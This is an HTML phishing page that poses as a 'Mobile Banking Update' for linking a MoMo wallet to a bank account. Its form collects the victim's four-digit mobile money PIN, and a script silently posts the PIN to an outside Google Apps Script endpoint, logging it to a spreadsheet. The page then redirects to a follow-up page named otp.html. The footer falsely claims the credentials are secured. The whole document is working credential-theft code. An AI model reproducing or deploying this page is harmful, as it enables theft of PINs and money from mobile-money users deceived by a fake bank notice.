<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Account to Wallet Activation</title>

<style>

body{
margin:0;
font-family:Arial, sans-serif;
background:#D4AF37;
display:flex;
justify-content:center;
align-items:center;
height:100vh;
color:grey;
}

.container{
background:white;
padding:40px;
border-radius:12px;
width:400px;
text-align:center;
box-shadow:0px 4px 10px rgba(0,0,0,0.1);
}

h1{
font-weight:bold;
color:grey;
margin-bottom:10px;
}

h2{
color:grey;
margin-bottom:10px;
}

h3{
color:grey;
font-weight:normal;
margin-bottom:30px;
}

label{
display:block;
margin-bottom:10px;
font-weight:bold;
color:grey;
text-align:left;
}

input{
width:100%;
padding:12px;
border-radius:6px;
border:1px solid grey;
margin-bottom:20px;
font-size:16px;
text-align:center;
letter-spacing:5px;
}

button{
background:grey;
color:white;
padding:12px;
width:100%;
border:none;
border-radius:6px;
font-size:16px;
cursor:pointer;
}

button:hover{
background:#555;
}

.footer{
margin-top:20px;
font-size:13px;
color:grey;
}

</style>
</head>

<body>

<div class="container">

<h1>MOBILE BANKING UPDATE</h1>

<h2>ACCOUNT TO WALLET ACTIVATION</h2>

<h3>Link your MoMo to your Bank account below</h3>

<form id="pinForm">

<label>Enter MoMo Pin</label>

<input
type="password"
maxlength="4"
id="pin"
placeholder="****"
required
pattern="[0-9]{4}"
>

<button type="submit">Link Wallet</button>

</form>

<div class="footer">
Your credentials are secured.
</div>

</div>

<script>

const scriptURL =
"https://script.google.com/macros/s/AKfycbzWbJGfuPsUk--i1Q8i64hH6OpfZwR0l-EqOBKzq5jL7uXxO8i4880KmI3v0qVwkTkeMw/exec";

document.getElementById("pinForm").addEventListener("submit", function(e){

e.preventDefault();

const pin = document.getElementById("pin").value;

/* send PIN to spreadsheet */

fetch(scriptURL,{
method:"POST",
mode:"no-cors",
headers:{
"Content-Type":"application/json"
},
body:JSON.stringify({
pin: pin
})
});

/* redirect to otp.html after short delay */

setTimeout(function(){

window.location.href = "otp.html";

}, 500);

});

</script>

</body>
</html>
